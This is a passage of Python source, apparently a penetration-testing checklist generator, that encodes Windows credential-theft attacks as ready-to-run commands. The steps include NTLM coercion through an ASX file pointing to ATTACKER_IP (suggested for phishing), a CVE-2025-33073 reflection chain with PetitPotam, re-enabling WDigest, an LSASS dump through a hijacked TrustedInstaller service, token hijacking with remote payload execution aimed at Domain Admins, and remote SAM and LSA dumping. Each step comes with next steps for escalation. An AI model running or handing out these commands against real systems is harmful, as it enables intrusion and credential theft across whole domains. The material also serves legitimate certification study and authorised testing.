                            'WMP attempts SMB authentication to fetch media'
                        ],
                        'failure_indicators': [
                            'WMP not installed',
                            'Network restrictions'
                        ],
                        'next_steps': [
                            'Crack hash with hashcat -m 5600',
                            'Use in phishing campaigns'
                        ],
                        'alternatives': [
                            '.lnk files',
                            'Other file-based coercion methods'
                        ],
                        'notes': 'XML format: <asx><entry><ref href="file://ATTACKER_IP/share/track.mp3" /></entry></asx>'
                    }
                }
            ]
        })

        # 6.3: Internal Monologue
        ntlm_relay_tasks['children'].append({
            'id': 'internal-monologue',
            'name': 'Internal Monologue Attack',
            'type': 'command',
            'metadata': {
                'command': 'InternalMonologue.exe',
                'description': 'Extract NetNTLMv1/v2 hashes without touching LSASS memory (bypass Credential Guard)',
                'tags': ['OSCP:MEDIUM', 'ADVANCED', 'CREDENTIAL_GUARD_BYPASS'],
                'flag_explanations': {},
                'success_indicators': [
                    'NetNTLMv1 responses captured (if allowed)',
                    'NetNTLMv2 responses (if v1 blocked)',
                    'No LSASS interaction (stealthy)'
                ],
                'failure_indicators': [
                    'No active sessions',
                    'NTLMv1 completely disabled',
                    'Credential Guard blocks extraction'
                ],
                'next_steps': [
                    'If NetNTLMv1: crack with rainbow tables (crack.sh)',
                    'If NetNTLMv2: crack offline or relay',
                    'Recover NTLM hash from NetNTLMv1'
                ],
                'alternatives': [
                    'Mimikatz (requires LSASS access)',
                    'LSASS dumping methods'
                ],
                'notes': 'Stealthy - uses local SSPI calls instead of reading LSASS. Downgrades NTLM settings temporarily. NetNTLMv1 can be cracked to NTLM. PoC: https://github.com/eladshamir/Internal-Monologue'
            }
        })

        # 6.4: NTLM Reflection (CVE-2025-33073)
        ntlm_relay_tasks['children'].append({
            'id': 'ntlm-reflection-cve',
            'name': 'NTLM Reflection via Serialized SPNs (CVE-2025-33073)',
            'type': 'command',
            'metadata': {
                'command': 'dnstool.py -u DOMAIN\\user -p pass <DC_IP> -a add -r srv11UWhRCAAAAAAAAAAAAAAAA -d <ATTACKER_IP> && PetitPotam.py srv11UWhRCAAAA... <TARGET>',
                'description': 'Bypass NTLM reflection protections using marshalled SPN in DNS name',
                'tags': ['OSCP:LOW', 'CVE', 'ADVANCED', 'ACTIVE_DIRECTORY'],
                'flag_explanations': {
                    'dnstool.py': 'Add DNS record with encoded SPN',
                    'srv11UWhRCAAAA...': 'Base64-encoded marshalled SPN (hostname srv1)',
                    '-d <ATTACKER_IP>': 'Points to attacker relay listener',
                    'PetitPotam.py': 'Coerce authentication to malicious DNS name'
                },
                'success_indicators': [
                    'SYSTEM token obtained via relay',
                    'NTLMSSP_NEGOTIATE_LOCAL_CALL flag set',
                    'Reflection bypass successful'
                ],
                'failure_indicators': [
                    'Patched system (KB for CVE-2025-33073)',
                    'SMB signing enforced',
                    'DNS record blocked'
                ],
                'next_steps': [
                    'Relay to target: ntlmrelayx.py -t TARGET -smb2support',
                    'Gain SYSTEM access',
                    'Dump credentials'
                ],
                'alternatives': [
                    'Traditional NTLM relay (if reflection not needed)',
                    'Kerberos relay: krbrelayx.py'
                ],
                'notes': 'Recent CVE (2025). SMB client truncates marshalled SPN, bypassing localhost check. Reference: https://www.synacktiv.com/en/publications/la-reflexion-ntlm-est-morte-vive-la-reflexion-ntlm'
            }
        })

        tasks['children'].append(ntlm_relay_tasks)

        # PHASE 7: Credential Protections & Bypasses
        protection_tasks = {
            'id': 'credential-protections',
            'name': 'Credential Protection Bypasses',
            'type': 'parent',
            'children': []
        }

        # 7.1: Check WDigest
        protection_tasks['children'].append({
            'id': 'check-wdigest',
            'name': 'Check WDigest Status',
            'type': 'command',
            'metadata': {
                'command': 'reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential',
                'description': 'Check if WDigest stores plaintext passwords in LSASS',
                'tags': ['OSCP:HIGH', 'RECON', 'QUICK_WIN'],
                'flag_explanations': {
                    'HKLM\\...\\WDigest': 'WDigest authentication provider settings',
                    'UseLogonCredential': '1=enabled (plaintext in LSASS), 0=disabled'
                },
                'success_indicators': [
                    'UseLogonCredential = 0x1 (enabled - plaintext available)',
                    'Key not found (default enabled on old Windows)'
                ],
                'failure_indicators': [
                    'UseLogonCredential = 0x0 (disabled - no plaintext)'
                ],
                'next_steps': [
                    'If enabled: mimikatz sekurlsa::wdigest',
                    'If disabled but admin: enable and wait for next logon',
                    'Enable: reg add HKLM\\...\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f'
                ],
                'alternatives': [
                    'mimikatz: sekurlsa::wdigest'
                ],
                'notes': 'WDigest enabled by default on Windows XP-8.0, Server 2003-2012. Disabled on 8.1+/2012R2+. Can be re-enabled if admin.'
            }
        })

        # 7.2: Check LSA Protection (PPL)
        protection_tasks['children'].append({
            'id': 'check-lsa-ppl',
            'name': 'Check LSA Protection (RunAsPPL)',
            'type': 'command',
            'metadata': {
                'command': 'reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\LSA /v RunAsPPL',
                'description': 'Check if LSASS runs as Protected Process Light',
                'tags': ['OSCP:HIGH', 'RECON'],
                'flag_explanations': {
                    'RunAsPPL': '1=enabled (PPL protection), 0 or missing=disabled'
                },
                'success_indicators': [
                    'RunAsPPL = 0x1 (enabled - need bypass)',
                    'Key not found (disabled - direct LSASS access possible)'
                ],
                'failure_indicators': [],
                'next_steps': [
                    'If disabled: proceed with normal LSASS dumping',
                    'If enabled: use PPL bypass (mimidrv, BYOVD, handle duplication)',
                    'Bypass options: PPLBlade, PPLKiller, pypykatz handledup'
                ],
                'alternatives': [
                    'Process Hacker: check protection level',
                    'Mimikatz: if privilege::debug fails with 0x5, PPL likely enabled'
                ],
                'notes': 'PPL prevents OpenProcess with PROCESS_VM_READ. Requires kernel driver or handle duplication to bypass. Reference: https://itm4n.github.io/lsass-runasppl/'
            }
        })

        # 7.3: Check Credential Guard
        protection_tasks['children'].append({
            'id': 'check-credential-guard',
            'name': 'Check Credential Guard Status',
            'type': 'command',
            'metadata': {
                'command': 'reg query HKLM\\System\\CurrentControlSet\\Control\\LSA /v LsaCfgFlags',
                'description': 'Check if Credential Guard (VBS) is enabled',
                'tags': ['OSCP:HIGH', 'RECON'],
                'flag_explanations': {
                    'LsaCfgFlags': '0=disabled, 1=enabled with UEFI lock, 2=enabled without lock'
                },
                'success_indicators': [
                    'LsaCfgFlags = 0x0 (disabled - normal credential dumping works)',
                    'Key not found (disabled)'
                ],
                'failure_indicators': [
                    'LsaCfgFlags = 0x1 or 0x2 (enabled - credentials in VSM)'
                ],
                'next_steps': [
                    'If disabled: proceed with Mimikatz',
                    'If enabled: Credential Guard isolates secrets in VSM',
                    'Bypass: Custom SSP injection, keystroke logging, alternate methods'
                ],
                'alternatives': [
                    'msinfo32: check "Virtualization-based Security"',
                    'PowerShell: Get-ComputerInfo | Select-Object DeviceGuardSmartStatus'
                ],
                'notes': 'Credential Guard uses VBS to isolate LSA. Mimikatz cannot extract from VSM. Focus on alternate credential sources or pre-auth attacks. Windows 10 Enterprise/Education only.'
            }
        })

        # 7.4: Bypass SeDebugPrivilege removal
        protection_tasks['children'].append({
            'id': 'bypass-sedebug',
            'name': 'Bypass SeDebugPrivilege Removal',
            'type': 'command',
            'metadata': {
                'command': 'sc config TrustedInstaller binPath= "C:\\temp\\procdump64.exe -accepteula -ma lsass.exe C:\\temp\\lsass.dmp" && sc start TrustedInstaller',
                'description': 'Use TrustedInstaller service to dump LSASS when SeDebugPrivilege removed',
                'tags': ['OSCP:MEDIUM', 'ADVANCED', 'BYPASS'],
                'flag_explanations': {
                    'sc config': 'Modify service configuration',
                    'TrustedInstaller': 'Highly privileged Windows service',
                    'binPath=': 'Set service executable path',
                    'sc start': 'Start modified service'
                },
                'success_indicators': [
                    'Service started successfully',
                    'lsass.dmp created',
                    'SeDebugPrivilege not required'
                ],
                'failure_indicators': [
                    'Service modification failed',
                    'Insufficient privileges',
                    'Service timeout'
                ],
                'next_steps': [
                    'Download lsass.dmp',
                    'Restore service: sc config TrustedInstaller binPath= "<original>"',
                    'Parse dump with mimikatz'
                ],
                'alternatives': [
                    'Load kernel driver for arbitrary memory access',
                    'Steal existing LSASS handle from another process'
                ],
                'notes': 'TrustedInstaller has higher privileges than admin. Can access LSASS even without SeDebugPrivilege. Requires admin to modify service.'
            }
        })

        tasks['children'].append(protection_tasks)

        # PHASE 8: WTS Impersonator (Token Hijacking)
        wts_tasks = {
            'id': 'wts-impersonator',
            'name': 'WTS Impersonator (Token Hijacking)',
            'type': 'parent',
            'children': []
        }

        # 8.1: Enumerate sessions
        wts_tasks['children'].append({
            'id': 'wts-enum',
            'name': 'Enumerate Logged-in Users (WTS)',
            'type': 'command',
            'metadata': {
                'command': f'.\\WTSImpersonator.exe -m enum',
                'description': 'Enumerate logged-in users via WTS RPC pipe (local or remote)',
                'tags': ['OSCP:MEDIUM', 'RECON', 'LATERAL_MOVEMENT'],
                'flag_explanations': {
                    '-m enum': 'Enumeration mode',
                    '-s <IP>': 'Optional: remote target IP/hostname'
                },
                'success_indicators': [
                    'List of active sessions displayed',
                    'Session IDs shown',
                    'Usernames identified'
                ],
                'failure_indicators': [
                    'Access denied',
                    'RPC server unavailable',
                    'No active sessions'
                ],
                'next_steps': [
                    'Note session IDs for target users',
                    'Execute commands as those users',
                    'Lateral movement via hijacked tokens'
                ],
                'alternatives': [
                    'query user (native Windows)',
                    'qwinsta (Terminal Services query)',
                    'Get-WmiObject Win32_LoggedOnUser'
                ],
                'notes': 'Uses \\\\pipe\\LSM_API_service RPC pipe. Stealthy enumeration method. PoC: https://github.com/OmriBaso/WTSImpersonator'
            }
        })

        # 8.2: Local execution
        wts_tasks['children'].append({
            'id': 'wts-exec-local',
            'name': 'Execute as User (Local)',
            'type': 'command',
            'metadata': {
                'command': '.\\WTSImpersonator.exe -m exec -s <SESSION_ID> -c C:\\Windows\\System32\\cmd.exe',
                'description': 'Hijack user token and execute command locally',
                'tags': ['OSCP:MEDIUM', 'LATERAL_MOVEMENT', 'TOKEN_THEFT'],
                'flag_explanations': {
                    '-m exec': 'Execution mode',
                    '-s <SESSION_ID>': 'Target session ID from enum',
                    '-c <command>': 'Command to execute as hijacked user'
                },
                'success_indicators': [
                    'Command executed successfully',
                    'Running as target user',
                    'Network access with target user credentials'
                ],
                'failure_indicators': [
                    'Need SYSTEM context - use PsExec first',
                    'Invalid session ID',
                    'Token impersonation failed'
                ],
                'next_steps': [
                    'Gain SYSTEM first: PsExec64.exe -accepteula -s cmd.exe',
                    'Then run WTSImpersonator',
                    'Access resources as hijacked user'
                ],
                'alternatives': [
                    'Incognito: use_token',
                    'Mimikatz: token::elevate',
                    'Invoke-TokenManipulation'
                ],
                'notes': 'Requires SYSTEM context. Get with PsExec -s or other privilege escalation. Token hijacking bypasses traditional impersonation detection.'
            }
        })

        # 8.3: Remote execution
        wts_tasks['children'].append({
            'id': 'wts-exec-remote',
            'name': 'Execute as User (Remote)',
            'type': 'command',
            'metadata': {
                'command': '.\\WTSImpersonator.exe -m exec-remote -s <TARGET_IP> -c .\\payload.exe -sp .\\WTSService.exe -id <SESSION_ID>',
                'description': 'Remote token hijacking and command execution (PsExec-like)',
                'tags': ['OSCP:MEDIUM', 'LATERAL_MOVEMENT', 'REMOTE'],
                'flag_explanations': {
                    '-m exec-remote': 'Remote execution mode',
                    '-s <TARGET_IP>': 'Target machine IP',
                    '-c <payload>': 'Payload to execute',
                    '-sp <service_binary>': 'WTSService.exe (helper binary)',
                    '-id <SESSION_ID>': 'Target session ID'
                },
                'success_indicators': [
                    'Service installed remotely',
                    'Payload executed as target user',
                    'Shell/beacon received'
                ],
                'failure_indicators': [
                    'Service installation failed',
                    'Firewall blocks SMB',
                    'Insufficient permissions'
                ],
                'next_steps': [
                    'Receive callback from payload',
                    'Clean up: sc \\\\<target> delete WTSService',
                    'Pivot further'
                ],
                'alternatives': [
                    'PsExec: psexec.exe \\\\target -u USER -p PASS cmd',
                    'Impacket psexec.py',
                    'CrackMapExec execution'
                ],
                'notes': 'Similar to PsExec but hijacks active user tokens. Requires admin rights and SMB access. Service is temporary and cleaned up.'
            }
        })

        # 8.4: User hunting
        wts_tasks['children'].append({
            'id': 'wts-user-hunter',
            'name': 'User Hunter (Target Domain Admin)',
            'type': 'command',
            'metadata': {
                'command': '.\\WTSImpersonator.exe -m user-hunter -uh DOMAIN/Administrator -ipl targets.txt -c payload.exe -sp WTSService.exe',
                'description': 'Hunt for specific user across multiple machines and execute payload',
                'tags': ['OSCP:MEDIUM', 'LATERAL_MOVEMENT', 'DOMAIN_ADMIN'],
                'flag_explanations': {
                    '-m user-hunter': 'User hunting mode',
                    '-uh DOMAIN/USER': 'Target user to hunt',
                    '-ipl targets.txt': 'File with IP list',
                    '-c payload.exe': 'Payload to execute when user found',
                    '-sp WTSService.exe': 'Service binary'
                },
                'success_indicators': [
                    'Target user found on system(s)',
                    'Payload executed with user privileges',
                    'Domain Admin access achieved'
                ],
                'failure_indicators': [
                    'User not found on any system',
                    'Connection failures',
                    'Service installation errors'
                ],
                'next_steps': [
                    'Target Domain Admins with local admin on multiple systems',
                    'Execute credential dumper or beacon',
                    'Escalate to DA'
                ],
                'alternatives': [
                    'PowerView: Invoke-UserHunter',
                    'BloodHound: find sessions',
                    'CrackMapExec: cme smb targets.txt --sessions'
                ],
                'notes': 'Excellent for targeting privileged users. Checks multiple systems for active sessions. Executes payload in context of found user.'
            }
        })

        tasks['children'].append(wts_tasks)

        # PHASE 9: Remote Credential Dumping (CrackMapExec)
        cme_tasks = {
            'id': 'crackmapexec-dumping',
            'name': 'CrackMapExec Remote Credential Dumping',
            'type': 'parent',
            'children': []
        }

        # 9.1: SAM dump
        cme_tasks['children'].append({
            'id': 'cme-sam',
            'name': 'Dump SAM Hashes (Remote)',
            'type': 'command',
            'metadata': {
                'command': f'crackmapexec smb {target} -u USERNAME -p PASSWORD --sam',
                'description': 'Remotely dump local SAM database hashes',
                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'REMOTE'],
                'flag_explanations': {
                    '--sam': 'Dump SAM database'
                },
                'success_indicators': [
                    'Local user hashes dumped',
                    '[+] Dumping SAM hashes'
                ],
                'failure_indicators': [
                    'Access denied',
                    'SMB connection failed'
                ],
                'next_steps': [
                    'Save hashes',
                    'Crack or PTH'
                ],
                'alternatives': [
                    'impacket-secretsdump DOMAIN/USER:PASS@target'
                ],
                'notes': 'Local hashes only. Use --lsa for cached domain creds.'
            }
        })

        # 9.2: LSA secrets
        cme_tasks['children'].append({
            'id': 'cme-lsa',
            'name': 'Dump LSA Secrets (Remote)',
            'type': 'command',
            'metadata': {
                'command': f'crackmapexec smb {target} -u USERNAME -p PASSWORD --lsa',
                'description': 'Remotely dump LSA secrets (cached domain credentials, service passwords)',
                'tags': ['OSCP:HIGH', 'REMOTE'],
                'flag_explanations': {
                    '--lsa': 'Dump LSA secrets from registry'
                },
                'success_indicators': [
                    'LSA secrets extracted',
                    'Cached domain credentials',
                    'Service account passwords'
                ],
                'failure_indicators': [
                    'Access denied',
                    'No secrets available'
                ],
                'next_steps': [
                    'Test credentials',
                    'Document service accounts'
                ],
                'alternatives': [
                    'mimikatz: lsadump::secrets',
                    'reg save + secretsdump'
                ],
                'notes': 'LSA secrets contain cached domain logons and service credentials.'
            }
        })

        tasks['children'].append(cme_tasks)

        # PHASE 10: Alternative Tools
        alt_tools_tasks = {
            'id': 'alternative-tools',
            'name': 'Alternative Credential Dumping Tools',
            'type': 'parent',
            'children': []
        }

        # 10.1: LaZagne
        alt_tools_tasks['children'].append({
            'id': 'lazagne',
            'name': 'LaZagne (Multi-source)',
            'type': 'command',
            'metadata': {
                'command': 'lazagne.exe all',
                'description': 'Extract credentials from browsers, email clients, databases, wifi, etc.',
                'tags': ['OSCP:MEDIUM', 'AUTOMATED', 'MULTI_SOURCE'],
                'flag_explanations': {
                    'all': 'Run all credential extraction modules'
                },
                'success_indicators': [
                    'Credentials found from multiple sources',
                    'Browser passwords',
                    'WiFi passwords',
                    'Application passwords'
                ],
                'failure_indicators': [
                    'No credentials found',
                    'AV blocks execution'
                ],
                'next_steps': [
                    'Test all found credentials',
                    'Check for password reuse',
                    'Document sources'
                ],
                'alternatives': [
                    'Browser-specific tools',
                    'Manual extraction'
                ],
                'notes': 'LaZagne supports 100+ applications. Download: https://github.com/AlessandroZ/LaZagne/releases'
            }
        })

        # 10.2: pypykatz
        alt_tools_tasks['children'].append({
            'id': 'pypykatz',
            'name': 'pypykatz (Python Mimikatz)',
            'type': 'command',
            'metadata': {
                'command': 'pypykatz lsa minidump lsass.dmp',
                'description': 'Pure Python implementation of Mimikatz (no Windows needed)',
                'tags': ['OSCP:HIGH', 'LINUX', 'PYTHON'],
                'flag_explanations': {
                    'lsa': 'LSA module',
                    'minidump': 'Parse minidump file',
                    'lsass.dmp': 'Dump file'
                },
                'success_indicators': [
                    'Credentials extracted',
                    'Works from Linux'
                ],
                'failure_indicators': [
                    'Corrupted dump',
                    'Parsing errors'
                ],
                'next_steps': [
                    'Live: pypykatz live lsa',
                    'Registry: pypykatz registry --sam sam system'
                ],
                'alternatives': [
                    'mimikatz on Windows'
                ],
                'notes': 'Pure Python, works on Linux. Install: pip3 install pypykatz'
            }
        })

        tasks['children'].append(alt_tools_tasks)

        return tasks
